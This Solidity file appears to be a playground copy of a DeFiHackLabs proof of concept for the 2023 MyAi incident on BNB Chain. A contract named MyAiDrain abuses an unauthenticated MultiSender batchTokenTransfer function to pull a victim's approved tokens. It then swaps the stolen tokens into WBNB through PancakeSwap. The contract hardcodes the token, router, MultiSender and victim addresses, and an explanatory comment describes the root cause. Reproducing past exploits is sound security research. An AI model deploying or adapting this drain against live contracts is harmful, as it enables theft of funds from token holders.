// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-MyAi).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest`, `attacker = address(this)`, no callback needed) — there is no
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit + TOKENToWBNB) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/MyAi_exp.sol.
//
// Root cause: MultiSender.batchTokenTransfer() is a public, unauthenticated
// batch-send helper. Its internal tokenTransfer() checks
// `allowance(msg.sender, address(this))` but then calls
// `transferFrom(_from, address(this), totalAmount)` — pulling from an
// attacker-chosen `_from`, never requiring `_from == msg.sender`. Any address
// with a standing ERC20 allowance to MultiSender can be drained by anyone. The
// stolen MyAi (a reflection/fee-on-transfer token) is then dumped into an
// extremely thin MyAi/WBNB pool, extracting almost the entire WBNB side.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMultiSender {
    function batchTokenTransfer(
        address _from,
        address[] memory _address,
        uint256[] memory _amounts,
        address token,
        uint256 totalAmount,
        bool isToken
    ) external payable;
}

contract MyAiDrain {
    IERC20 constant MyAi = IERC20(0x40d1E011669c0dc7Dc7c7Fb93E623d6A661Df5Ee);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IMultiSender constant MultiSender = IMultiSender(0xDb103fd28Ca4B18115F5Ce908baaeed7E0f1f101);
    address constant Victim = 0x003B724f9e1fa7350A7723BB8313ACBDbE7188CB;

    // step 0: approve router + MultiSender, then drain the victim's standing
    // allowance via the unauthenticated batchTokenTransfer(), fanning all 100
    // recipient slots back to this contract; finally dump the stolen MyAi into
    // the thin MyAi/WBNB pool over 100 swaps.
    function run() external payable {
        MyAi.approve(address(PancakeRouter), type(uint256).max);
        MyAi.approve(address(MultiSender), type(uint256).max);

        address[] memory Attack = new address[](100);
        for (uint256 i = 0; i < Attack.length; i++) {
            Attack[i] = address(this);
        }
        uint256[] memory Token = new uint256[](100);
        for (uint256 i = 0; i < Attack.length; i++) {
            Token[i] = 999_999_999_999_400;
        }

        MultiSender.batchTokenTransfer{value: 1 ether}(
            Victim, Attack, Token, address(MyAi), 999_999_999_999_400 * 100, true
        );
        for (uint256 i = 0; i < 100; i++) {
            TOKENToWBNB();
        }
    }

    function TOKENToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(MyAi);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            999_999_999_999_400, 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
